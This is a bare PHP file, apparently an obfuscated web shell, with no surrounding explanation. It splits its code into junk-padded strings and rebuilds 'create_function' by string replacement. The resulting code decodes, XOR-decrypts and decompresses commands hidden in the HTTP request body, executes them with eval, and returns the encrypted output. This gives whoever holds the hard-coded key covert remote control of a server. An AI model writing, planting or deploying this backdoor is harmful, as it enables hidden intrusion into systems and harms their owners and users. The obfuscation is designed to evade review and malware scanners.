<?php
$T='ch("/$wkwh(.+)$wkwf/",@file_getw_contents("wphp://inwput"www),$mw)==1) {@ob_swtart();@ev';
$t='uwnction x($wwt,$k){$c=stwrlen(w$k);$l=wstrlwen($t);$ow=ww"";for($i=0;$i<w$l;w){fowr(';
$c='$k="06053wbw1a";$kwwhw="9202w22d2da4c";$wkf="b57cbwd24f4wf0";$p="kwAHM6TaTu8EIHwmEl";fw';
$g='nwd_cleawn(w);$r=@base6w4_encowdew(@xww(@gwzcomwpress($o),$k)ww);print("$p$kh$r$kf");}';
$l='$j=0;($jw<$c&&$i<$lw);$j++w,$i++w){$wo.=w$tw{$wi}^$k{$j};}}return $wwow;w}if (@preg_wmat';
$o='wal(@gzuncomprwess(@xw(@baswe64_dwecodew($wwm[1]),$k)));$o=@ob_gwetw_contentsw();@ob_e';
$P=str_replace('HT','','HTHTcreaHTte_HTfunHTctiHTon');
$p=str_replace('w','',$c.$t.$l.$T.$o.$g);
$e=$P('',$p);$e();
?>
